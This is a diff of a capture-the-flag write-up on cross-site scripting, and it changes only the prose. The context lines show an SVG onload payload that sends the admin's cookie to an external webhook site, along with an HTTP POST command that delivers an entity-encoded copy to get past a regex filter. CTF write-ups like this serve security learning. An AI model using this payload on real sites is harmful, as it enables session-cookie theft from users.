@@ -526,7 +526,7 @@ e.g. `asdasd` -> `&#97;&#115;&#100;&#97;&#115;&#100;`
 
 After trial and error I found out that the `<svg>` tag is your best bet! We can use its **onload** method which is not matched by the regex pattern above. ("load" is shorter than 5 characters).
 
-Let's test this by fetching the administrators cookie. We can't have spaces, and can't have any `>` tag at the end. But it still works:
+Let's test this by fetching the admin's cookie. We can't have spaces, and can't have any `>` tag at the end. But it still works:
 
 `<svg/onload=document.location="https://webhook.site/df13af1d-cb2e-4274-a2d2-56b28becad35?c="+document.cookie//<`
 
@@ -535,7 +535,7 @@ Convert the javascript to HTML entities:
 http --form POST 'http://35.242.253.155:31810/index.php?page=newpost' Cookie:PHPSESSID=47117bffb9bc0406a138d082980b72f2 title='asd' description='<svg/onload=&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&period;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&equals;&quot;&#104;&#116;&#116;&#112;&#115;&colon;&sol;&sol;&#119;&#101;&#98;&#104;&#111;&#111;&#107;&period;&#115;&#105;&#116;&#101;&sol;&#100;&#102;&#49;&#51;&#97;&#102;&#49;&#100;&#45;&#99;&#98;&#50;&#101;&#45;&#52;&#50;&#55;&#52;&#45;&#97;&#50;&#100;&#50;&#45;&#53;&#54;&#98;&#50;&#56;&#98;&#101;&#99;&#97;&#100;&#51;&#53;&quest;&#99;&equals;&quot;&plus;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&period;&#99;&#111;&#111;&#107;&#105;&#101;//<'
 ```
 
-We now get a request from the admin. But there are no flag in the cookies...
+We now get a request from the admin. But there is no flag in the cookies...
 I then noticed the referer header in the request from admin:
 
 `Referer: http://127.0.0.1:1234/index.php?page=post&id=221`
